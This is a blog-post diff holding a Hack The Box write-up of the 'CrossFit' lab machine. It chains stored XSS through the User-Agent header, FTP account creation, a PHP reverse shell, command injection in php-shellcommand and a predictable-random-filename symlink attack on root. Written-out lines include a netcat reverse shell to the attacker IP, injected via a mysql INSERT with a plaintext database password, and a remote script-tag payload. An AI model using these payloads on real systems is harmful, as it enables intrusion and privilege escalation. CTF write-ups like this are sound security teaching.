@@ -1,0 +1,329 @@
+---
+layout: single
+title:  "HTB: CrossFit"
+classes: wide
+excerpt: "I loved CrossFit. It was a really tough box that forces you to write exploits in JavaScript, C, Python and Bash. It starts by finding a subdomain in a SSL certificate..."
+categories: HTB
+---
+
+![0](/assets/images/HTB/Crossfit/0.png){: width="500px" }
+
+I loved CrossFit. It just a really tough box that forces you to write exploits in JavaScript, C, Python and Bash. It starts by finding a subdomain in a SSL certificate and that subdomain has a form that when trying XSS on it, it generates a report doesn't filter User-Agent properly before it logs it which leads to XSS. From there and since we are restricted to view only one subdomin we use the XSS for subdomian enumeration and find one that can be used to create FTP accounts. After gaining access to FTP we download the web app files and find some database credentials over there and also we can upload a php reverse shell on another subdomain that is accessible by the remote admin and get a reverse shell then find a user credentials stored somewhere. After getting user you can escalate to another user by exploiting a command Injection vulnerability in php-shellcommand PHP interface. Finally, you find a custom binary that generates random file names in a insecure way that when exploited can allow arbitrary file write as root.
+
+## Recon
+`nmap`{:style="color:orange"} shows 3 ports open (ftp, ssh and http)
+
+```bash
+└──╼ $sudo nmap -p- -T5 --min-rate=5000 10.10.10.208
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-20 05:30 EET
+Warning: 10.10.10.208 giving up on port because retransmission cap hit (2).
+Nmap scan report for crossfit.htb (10.10.10.208)
+Host is up (3.0s latency).
+Not shown: 46716 filtered ports, 18816 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+```
+![2](/assets/images/HTB/Crossfit/2.png)
+
+## TCP 80 – HTTP
+
+After adding `crossfit.htb`{:style="color:orange"} to my hosts file and testing for anonymous ftp access i started looking into port 80 that just displayed the default apache page and even after fuzzing with a couple of word lists I still couldn't find any interesting end-points.
+
+![3](/assets/images/HTB/Crossfit/3.png)
+
+Taking a closer look on what `nmap`{:style="color:orange"} said about port 21, I see that it is running ftp/ssl so, I decided to inspect the certificate because it is common in the context of HTB machines to find sub domains in ssl certificates
+
+I used `openssl`{:style="color:orange"} to inspect the certificate with: `openssl s_client -connect crossfit.htb:21 -starttls ftp -servername crossfit.htb`{:style="color:orange"}
+
+![4](/assets/images/HTB/Crossfit/4.png)
+
+Great! We've found another sub domain `gym-club.crossfit.htb`{:style="color:orange"} so I added that to my hosts file and finally we get something on port 80
+
+![5](/assets/images/HTB/Crossfit/5.png){: width="750px" }
+
+While exploring the web app I came across `http://gym-club.crossfit.htb/blog-single.php`{:style="color:orange"} that contained a some sort of a form for keaving comments, After trying basic XSS payload in it I get the following warning message:
+
+![6](/assets/images/HTB/Crossfit/6.png){: width="750px" }
+
+Huh! At first i thought i have to pass whatever xss protection they have but even after bypassing it i couldn't get a response back on my listener so I came back to read that warning again more carefully and it hints that they log my `browser information`{:style="color:orange"} and `IP`{:style="color:orange"} and an admin will view them immediately.
+
+After experimenting a bit and thinking about what that could mean, It turned out that by `Browser Information`{:style="color:orange"} they mean my `User-Agent`{:style="color:orange"} header parameter.
+Cool! so in odred to get this done correctly i need to send my actual malicious XSS payload in the User-Agent parameter and also send a message with a XSS payload that'll get detected so that my `User-Agent`{:style="color:orange"} (that contain real XSS payload) will get logged and the admin will view (execute) it. That's of course assuming that they don't properly filter the info that they log.
+
+![7](/assets/images/HTB/Crossfit/7.png){: width="750px" }
+
+![8](/assets/images/HTB/Crossfit/8.png)
+
+Nice! Now just out of curiosity i wanted to see how they are logging that date so i used the following payload to see how it looks like:
+
+![9](/assets/images/HTB/Crossfit/9.png)
+
+![91](/assets/images/HTB/Crossfit/9.1.png)
+
+Okay, so it is actually only my `IP address`{:style="color:orange"}, `Timestamp`{:style="color:orange"} and the` User-Agent`{:style="color:orange"}. Furthermore, I wanted to see where are they logging that data so i did it like:
+
+![10](/assets/images/HTB/Crossfit/10.png)
+
+The date are logged at `http://gym-club.crossfit.htb/security_threat/report.php`{:style="color:orange"} but trying to access that page from my browser and i get some sort of a access denied message
+
+![11](/assets/images/HTB/Crossfit/11.png)
+
+So it seems that normal viewers can't view that page, only the `admins`{:style="color:orange"} can view it. My next Idea is to test for command executeing with php so i started testing that by executing `<?php system('whoami')?>`{:style="color:orange"} and sending the response back to me to see if it got executed
+
+![12](/assets/images/HTB/Crossfit/12.png)
+
+![13](/assets/images/HTB/Crossfit/13.png)
+
+Alright, It filters php code so logically my next step was trying to bypass that but I couldn't do it this time. Now is the time to consider other options and think about what else could be done with that XSS.
+
+The next step took a lot of time and experimentation but since `admins`{:style="color:orange"} can view pages that we, normal players can't view I could use that to enumerate more.
+Since I've already tried fuzzing for hidden directories and came up empty, It is time to fuzz for more sub domains
+
+## Automating Subdomian enumeration
+
+lets start this simple. Consider the following piece of code
+
+![141](/assets/images/HTB/Crossfit/14.1.png)
+
+all it does it sending a get request to `http://DummySub-Domain.crossfit.htb/`{:style="color:orange"} and when it gets a response it sends that response to my listener on port 8000. Since admins are not restricted in terms of viewing web pages, if i can make the admin execute that piece of code I can see what is actually there on `http://DummySub-Domain.crossfit.htb/`{:style="color:orange"}
+I can make the admin execute that code simply by changing the `User-Agent`{:style="color:orange"} value to `<script src="http://10.10.16.251/jA.js"></script>`{:style="color:orange"}
+That way I can make the admin execute a JS file hosted on my vm and contain the above code.
+
+Now Let's take it one step further. The above code is good for checking the validity of one subdomain but, to automate that I wrote the following python script:
+
+![142](/assets/images/HTB/Crossfit/14.2.png)
+
+The script does the following tasks:
+
+1. It starts by parsing a wordlist and saving all possible subdomains in a list named `subs`{:style="color:orange"}
+2. I'm creating a variable named `payload`{:style="color:orange"} that basically contain the code for visiting one subdomain but specifying a placeholder in place of that subdomain. so that I can dynamically change it in runtime
+3. I'm then changing `User-Agent`{:style="color:orange"} to force the admin to load my malicious JS script and also adding a `alert(1)`{:style="color:orange"} payload in the body of to trigger the XSS detection
+4. Finally, I'm iterating over the subdomains, adding every subdomain in the payload then writing that payload to `jA.js`{:style="color:orange"} file and then have the admin execute it, I then give it some time (3 seconds) then repeat the same process again with a new subdomain till I find all valid ones from the admin's point of view
+
+I didn't have to wait a lot till i got the result Indicating that there is something the admin can see at `http://ftp.crossfit.htb/`{:style="color:orange"}
+
+![14](/assets/images/HTB/Crossfit/14.png)
+
+Now we're talking! The response is rendered like:
+
+![15](/assets/images/HTB/Crossfit/15.png){: width="600px" }
+
+Ok, The page is giving us the options to create FTP accounts from `http://ftp.crossfit.htb/accounts/create`{:style="color:orange"} so I modified my js code again to see what parameters are required to create one.
+
+![161](/assets/images/HTB/Crossfit/16.1.png)
+
+![16](/assets/images/HTB/Crossfit/16.png)
+
+Checking the page source reveals that I need to send POST request containing a username, password, and a token to `http://ftp.crossfit.htb/accounts/`{:style="color:orange"}
+
+![17](/assets/images/HTB/Crossfit/17.png)
+
+One thing to notice here is that every time I send a request to `http://ftp.crossfit.htb/accounts/create`{:style="color:orange"} I get a different value for `_token`{:style="color:orange"} so I need to do two things to create an account successfully:
+
+1. Send a `GET`{:style="color:orange"} request to `http://ftp.crossfit.htb/accounts/create`{:style="color:orange"} to extract a valid token from it
+2. maintain a session between request to `http://ftp.crossfit.htb/accounts/create`{:style="color:orange"} and `http://ftp.crossfit.htb/accounts`{:style="color:orange"} If i wanted the token to be considerd valid
+
+So I wrote the below JS script to achieve that:
+
+![181](/assets/images/HTB/Crossfit/18.1.png)
+
+The first two lines are to maintain session between requests then at line 19 I'm using a regular expression to extract the value of `_token`{:style="color:orange"} then I'm sending a `POST`{:style="color:orange"} request to `http://ftp.crossfit.htb/accounts`{:style="color:orange"} to create a user and specifying it's username and password and I also wait the response on my listener to see If I'll get any message indicating If the user was created successfully or not.
+
+![18](/assets/images/HTB/Crossfit/18.png)
+
+## TCP 21 – FTP
+
+Now that I have valid FTP creds I can now access it but since it is running ftp/ssl I can't use `ftp`{:style="color:orange"} command-line utility. I can access it with either `lftp`{:style="color:orange"} which is also a command-line tool or I can use `FileZilla`{:style="color:orange"}, which gives you a nice GUI to work with.
+
+![19.1](/assets/images/HTB/Crossfit/19.1.png)
+
+So, there are a few directories on FTP. `ftp`{:style="color:orange"}, `gym-club`{:style="color:orange"} and `development-test`{:style="color:orange"} and given that I already have subdomain named `ftp`{:style="color:orange"} and one named `gym-club`{:style="color:orange"} then It makes sense that `development-test`{:style="color:orange"} is another subdomain that only admins can access.
+
+I downloaded the contents of ftp and gym-club to review the php files and found a `db.php`{:style="color:orange"} file that contained database credentials.
+
+![19.2](/assets/images/HTB/Crossfit/19.2.png)
+
+I thought I might use the same creds for SSH but that didn't work then i noticed that I can upload files to `development-test`{:style="color:orange"} so, I uploaded a php reverse shell there
+
+![19](/assets/images/HTB/Crossfit/19.png)
+
+Then I wrote a new JS code to have the admin access and execute my reverse shell and I finally get a shell
+
+![20](/assets/images/HTB/Crossfit/20.png)
+
+![21](/assets/images/HTB/Crossfit/21.png)
+
+## Getting User - Hank
+
+After some manual enumeration I decided to upload linpeas that pointed to a hash belongs to hank, which is a user on the box
+
+![22](/assets/images/HTB/Crossfit/22.png)
+
+As usual, I pass that hash to `john` to crack it and I manage to ssh as hank and read the user flag.
+
+![23](/assets/images/HTB/Crossfit/23.png)
+
+![24](/assets/images/HTB/Crossfit/24.png)
+
+## Getting User - Isaac
+
+Looking at what groups hank is in, I see `admins`{:style="color:orange"} group so normally I start by locating what files are readable/owned by that group using: `find / -group admins 2>/dev/null`{:style="color:orange"}
+
+![25](/assets/images/HTB/Crossfit/25.png)
+
+So, I can read three files in Isaac's home dir and I can read a bunch of PAM service configuration files
+
+I started by reading `send_updates.php`{:style="color:orange"} file in Isaac's home dir
+
+![26](/assets/images/HTB/Crossfit/26.png)
+
+It basically does the following:
+
+1. After importing a module named `php-shellcommand`{:style="color:orange"} which as an interface to execute shell commands in PHP, It is creating a filesystem iterator for a dir stored in `$msg_dir`{:style="color:orange"}.
+2. It starts iterating over things in that `$msg_dir`{:style="color:orange"} and if it finds any file in that directory It'll do the following two things.
+3. Fetch the email column from the database.
+4. Use `php-shellcommand`{:style="color:orange"} to execute a `mail`{:style="color:orange"} command and the parameter fetched from the db is passed to the `mail`{:style="color:orange"} command as an argument.
+
+Nothing fancy still, but after reading `composer.json`{:style="color:orange"} I see the php script is using `php-shellcommand v1.6.0`{:style="color:orange"}
+
+![27](/assets/images/HTB/Crossfit/27.png)
+
+Searching for possible vulnerabilities regarding that version I came across [this GitHub Issue](https://github.com/mikehaertl/php-shellcommand/issues/44){: target="_blank"} that talks about `escapeArgs`{:style="color:orange"} option is not working properly and is vulnerable to command injection. It is also Including a PoC to demonestrate the issue
+
+![28](/assets/images/HTB/Crossfit/28.png)
+
+The php script is executing `/usr/bin/mail -s CrossFit Clue Newsletter <Argument From DB>`{:style="color:orange"}.
+So I can inject a command `;nc 10.10.16.251 1234 -e /bin/sh ||`{:style="color:orange"} the email column in the `users`{:style="color:orange"} table and the overall command will look like:<br />
+`/usr/bin/mail -s CrossFit Clue Newsletter ;nc 10.10.16.251 1234 -e /bin/sh ||`{:style="color:orange"}
+
+---
+
+So far so good but, I still have two issues left.
+
+**Issue#1:** Let's say that I can inject command in the db, If i executed that php script myself then I'll end up with a reverse shell with as `hank`{:style="color:orange"} so no actual privilege escalation has been really done. Unless the script gets executed by `Isaac` there is no point of doing all of this. So to confirm this theory I started by checking `/etc/crontab`{:style="color:orange"} to see that indeed `send_updates.php`{:style="color:orange"} is executed every minute with `Isaac`{:style="color:orange"}'s privilege
+
+![29](/assets/images/HTB/Crossfit/29.png)
+
+Great! Now time to discuss the second issue.
+
+**Issue#2:** The second issue is that there should be at least one file in `$msg_dir`{:style="color:orange"} so that the `if condition `{:style="color:orange"} evaluates to true and the code gets executed.
+The problem is I still have no idea where that `$msg_dir`{:style="color:orange"} is located!
+
+I came back to the files owned by the `admin`{:style="color:orange"} group and started looking through the PAM service configuration files and I found a username and a password in `/etc/pam.d/vsftpd`{:style="color:orange"}
+
+![32](/assets/images/HTB/Crossfit/32.png)
+
+Without getting into too much details about what these lines mean, I thought I could ssh as `ftpadm`{:style="color:orange"} but turned out that this was a dead-end
+
+![33](/assets/images/HTB/Crossfit/33.png)
+
+Then I used FileZilla to login into FTP with these creds and find that i have access to a dir called `messages`{:style="color:orange"} so it makes sense that this is `$msg_dir`{:style="color:orange"} that I was searching for. So I added a dummy file in that dir.
+
+![34](/assets/images/HTB/Crossfit/34.png)
+
+then I injected a command in the db
+```bash
+hank@crossfit:~$ mysql -u crossfit -poeLoo~y2baeni crossfit -e 'INSERT INTO users (email) VALUES ("BlahBlah; nc 10.10.16.251 1234 -e /bin/sh ||");'
+hank@crossfit:~$ mysql -u crossfit -poeLoo~y2baeni crossfit -e 'select * from users'
++----+----------------------------------------------+
+| id | email                                        |
++----+----------------------------------------------+
+| 53 | BlahBlah; nc 10.10.16.251 1234 -e /bin/sh || |
++----+----------------------------------------------+
+```
+
+And finally, I waited till the next minute started then I got a shell as Isaac.
+
+![35](/assets/images/HTB/Crossfit/35.png)
+
+## Locating dbmsg
+
+After getting a shell as Isaac i came back to enumerate more. I see that Isaac is part of the `staff`{:style="color:orange"} group but that has access to a lot of selenum stuff that was probably used to automate the foothold part and also have access and write priv to `/var/local`{:style="color:orange"} but I still haven't figured out why yet.
+
+Another unique behaviour is that executing `ps aux`{:style="color:orange"} or even running `pspy`{:style="color:orange"} only shows commands and processes related to my current user.
+
+![36](/assets/images/HTB/Crossfit/36.png)
+
+Thats when I learned a new option of `pspy`{:style="color:orange"} and that is `-f`{:style="color:orange"} which also monitors file system events so I used that and monitored the output and I noticed that at the first second (XX:XX:01) of every minute a binary located at `/usr/bin/dbmsg`{:style="color:orange"} is accessed. What is interesting about that one is that it is not a standard linux binary.
+
+![37](/assets/images/HTB/Crossfit/37.png)
+
+Running that binary errors out and says that I must be root to run it.
+
+![38](/assets/images/HTB/Crossfit/38.png)
+
+## Analysing dbmsg
+
+dbmsg is x64 not stripped ELF binary. I loaded that in IDA and I start reversing it.
+The first thing I see it that It checks if the user running the binary is root or not. If it is root It seeds the random number generator with whatever the current time of the machine is at that runtime (I'll come to that later) then it executes a function called `process_data`{:style="color:orange"}
+
+![39](/assets/images/HTB/Crossfit/39.png){: width="750px"}
+
+`process_data`{:style="color:orange"} starts by creating a `MySQL`{:style="color:orange"} object then it establishes a connection with the DB
+
+![40](/assets/images/HTB/Crossfit/40.png){: width="650px"}
+
+It then retrieves the contents of `messages`{:style="color:orange"} table from the DB then opens a zip file located at `/var/backups/mariadb/comments/zip`{:style="color:orange"} which is actually irrelevant to the attack vector.
+
+![41](/assets/images/HTB/Crossfit/41.png)
+
+Finally, It does the following
+
+1. Checks that it successfully managed to retrieve all 4 columns from `messages`{:style="color:orange"} table then the Important part comes in
+2. Generates a random number based on the previous seed and then builds a string that consists of `md5sum(RandomNumber + the value from ID column frommessages table)`{:style="color:orange"}
+3. It then creates a file with that random name in `/var/local/`{:style="color:orange"} and writes the contents of the `messages`{:style="color:orange"} table in that file
+
+![42](/assets/images/HTB/Crossfit/42.png)
+
+## Brief Introduction to Pseudo Random Number Generators
+
+To explain the vulnerability here, you need to understand how computes generate random numbers (especially in C programming)
+
+Computers can't really generate real random numbers but rather it is `Pseudo Random Numbers`{:style="color:orange"} that is why it is common practice in C programming to seed the random number algorithm with the current time of the machine to give the illusion that it actually generates real random numbers. You'll see it done in C with `srand(time(0))`{:style="color:orange"}
+
+To demonstrate that, I wrote the following C program that generates 5 random numbers with a certain seed then I'll use the same seed to generate another 5 random numbers and you'll notice that each time, the same set of random numbers were generated
+
+![43](/assets/images/HTB/Crossfit/43.png)
+
+That's why whenever people want to generate random numbers in C it is an easy solution to generate it with `srand(time(0))`{:style="color:orange"} that seeds the algorithm with the current time of the machine
+
+## Getting Root Shell
+
+Now that you understand a bit about this method of generating random numbers, It is possible to know what is the random number that'll get generated at a certain point in time if we know the seed value
+
+Furthermore, the seed value is the current time of at runtime of that function and from pspy we know that it is at second 1 of each minute (XX:XX:01)
+
+and since I can predict the random number before it'll get generated on the box I can also predict the filename that'll get generated and create a symlink with the same link instead. I'll make that soft link point to `/root/.ssh/authorized_keys`{:style="color:orange"} then add my public key in the `messages`{:style="color:orange"} table. Then when dbmsg tries to create the file It'll see that it is already created then It'll wrote the contents of the `messages`{:style="color:orange"} table to that file, effectively adding my public key in root's authorized_keys.
+
+
+To manually exploit this will be a pain so I decided to automate this as well. Let's start small by writing a C program that takes the time in seconds, seeds the algorithm with that value and give us a random number.
+
+![44](/assets/images/HTB/Crossfit/44.png)
+
+Next step is to write a bash script to add my public key in the DB, then calls the C binary with the time in seconds, then it generates the name from `md5sum(RandomNumber+ID)`{:style="color:orange"} and finally, it creates the symlink at `/var/local`{:style="color:orange"} with that file name.
+
+![45](/assets/images/HTB/Crossfit/45.png)
+
+Finally, I wrote a python script to determine the current time of the machine, adds a `1`{:style="color:orange"} to the `current minutes`{:style="color:orange"} and sets `seconds`{:style="color:orange"} to `01`{:style="color:orange"} (which is the date that dbmsg will run at next time) then I converted that to seconds and supplied it to the bash script to generate the file.
+
+![46](/assets/images/HTB/Crossfit/46.png)
+
+**Note:** The python script is not handling if the current minute is `59`
+
+**Recap:** What is happening here is that my python script determines when dbmsg will run then feeds that time to the bash script that adds my public key to the DB then calls the C program and get a random number then create a symlink points to root's authorized keys
+
+I uploaded the 3 files to the box then I ran my python script
+
+![47](/assets/images/HTB/Crossfit/47.png)
+
+Then I waited till the new minute began and TaDaa!! Root Shell! 🥳🥳 
+
+![48](/assets/images/HTB/Crossfit/48.png)
+
+Feedback Is much appreciated!
+
+![49](/assets/images/HTB/Crossfit/49.png){: width="600px"}
+
+<img src="http://www.hackthebox.eu/badge/image/206208" alt="Hack The Box">
